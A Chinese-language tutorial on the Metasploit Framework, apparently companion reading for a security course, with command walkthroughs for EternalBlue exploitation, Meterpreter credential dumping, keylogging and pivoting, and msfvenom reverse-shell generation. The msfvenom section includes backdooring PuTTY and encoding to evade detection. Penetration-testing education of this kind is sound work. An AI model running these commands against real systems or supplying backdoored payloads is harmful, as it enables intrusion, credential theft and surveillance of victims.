# Metasploit 渗透测试框架深度使用指南

> 分类：工具指南 | 难度：进阶 | 阅读时间：约30分钟

## 概述

Metasploit Framework（MSF）是世界上使用最广泛的渗透测试平台。它集成了漏洞扫描、漏洞利用、Payload 生成、后渗透控制等完整攻击链组件。无论你是红队渗透测试员、蓝队安全研究员，还是漏洞分析工程师，Metasploit 都是绕不开的核心工具。

## 核心知识点

- MSF 的五大模块体系：exploit、auxiliary、payload、encoder、post
- Meterpreter 后渗透控制
- msfvenom Payload 生成与免杀基础
- MSF 数据库与工作区管理
- 渗透测试全流程自动化
- MSF 与 Nmap、Burp 的联动

## 正文

### 一、MSF 架构概览

```
┌─────────────────────────────────────────┐
│              msfconsole                  │
├─────────────────────────────────────────┤
│  exploits  │ aux │ payloads │ encoders  │
│  (漏洞利用) │ 辅助 │ (载荷)   │ (编码器)   │
├─────────────────────────────────────────┤
│  post (后渗透) │ nops │ evasion          │
├─────────────────────────────────────────┤
│        Rex / MSF Core / MSF Base        │
└─────────────────────────────────────────┘
```

**五大模块类型**：

| 模块 | 路径 | 说明 |
|------|------|------|
| exploit | exploit/平台/服务/漏洞名 | 漏洞利用代码 |
| auxiliary | auxiliary/扫描器类型/名称 | 扫描、Fuzz、信息收集 |
| payload | payload/平台/类型 | Shellcode 载荷 |
| encoder | encoder/平台/类型 | 载荷编码（免杀） |
| post | post/操作系统/功能 | 后渗透模块 |

### 二、基本使用流程

```bash
# 启动 PostgreSQL 数据库（记录扫描结果）
systemctl start postgresql
msfdb init

# 启动控制台
msfconsole
```

#### 2.1 标准渗透流程

```bash
# 1. 搜索目标相关模块
msf6 > search ms17-010

# 2. 选择并查看模块信息
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > info

# 3. 查看必要参数
msf6 > show options

# 4. 设置参数
msf6 > set RHOSTS 192.168.1.100
msf6 > set LHOST 10.0.0.5

# 5. 选择 Payload
msf6 > show payloads
msf6 > set payload windows/x64/meterpreter/reverse_tcp

# 6. 执行
msf6 > exploit
```

### 三、Auxiliary 辅助模块

辅助模块覆盖信息收集、漏洞验证、服务扫描等：

```bash
# 端口扫描
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 22,80,443,445,3389,8080
run

# SMB 版本探测
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# FTP 匿名登录检测
use auxiliary/scanner/ftp/anonymous
set RHOSTS 192.168.1.0/24
run

# HTTP 目录扫描
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.100
run
```

### 四、Meterpreter——核心后渗透武器

Meterpreter 是 Metasploit 的高级 Payload，运行在内存中，不留磁盘痕迹。

```bash
# 基础命令
meterpreter > sysinfo          # 系统信息
meterpreter > getuid           # 当前用户
meterpreter > getprivs         # 当前权限
meterpreter > ps               # 进程列表
meterpreter > migrate 1234     # 迁移进程
meterpreter > background       # 后台会话

# 文件操作
meterpreter > download /etc/passwd ./
meterpreter > upload evil.exe C:\\Windows\\Temp\\
meterpreter > edit /etc/ssh/sshd_config

# 网络操作
meterpreter > route add 10.10.0.0 255.255.255.0 1  # 添加内网路由
meterpreter > portfwd add -L 0.0.0.0 -l 8080 -r 10.10.0.5 -p 80  # 端口转发

# 凭证获取
meterpreter > hashdump        # Windows 本地密码哈希
meterpreter > load kiwi       # 加载 Mimikatz
meterpreter > creds_all       # 获取所有凭证

# 键盘记录与截图
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > screenshot
```

### 五、msfvenom——Payload 生成器

```bash
# 列出可用 Payload
msfvenom -l payloads | grep windows

# 生成 Windows 反弹 Shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o shell.exe

# 生成 Linux 反弹 Shell（ELF）
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf -o shell.elf

# 嵌入合法程序（后门化）
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -x putty.exe -k -f exe -o evil_putty.exe

# 编码绕过基础检测
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o shell.exe
```

### 六、工作区与数据库

```bash
# 创建工作区
msf6 > workspace -a pentest1
msf6 > workspace          # 查看所有工作区

# Nmap 联动（将扫描结果导入 MSF 数据库）
msf6 > db_nmap -sV 192.168.1.0/24

# 查看已发现的资产
msf6 > hosts
msf6 > services
msf6 > vulns

# 利用数据库自动匹配漏洞
msf6 > services -p 445    # 查看所有 SMB 服务
```

### 七、与 Burp Suite 联动

```
场景：对 Web 漏洞执行代码执行/命令注入获取 Shell

1. Burp 中拦截到命令注入点
2. 用 msfvenom 生成对应平台 Payload
3. 通过 Burp 的 Repeater 注入 Payload
4. MSF handler 接收反弹会话
```

```bash
# 启动 handler 等待连接
msf6 > use exploit/multi/handler
msf6 > set payload linux/x64/meterpreter/reverse_tcp
msf6 > set LHOST 10.0.0.5
msf6 > set LPORT 4444
msf6 > exploit -j     # 后台运行
```

---

> 📖 本文为"网安百宝箱"课程配套读物。
> 参考：Metasploit 官方文档 https://docs.metasploit.com/
> 更新于 2026-06-18
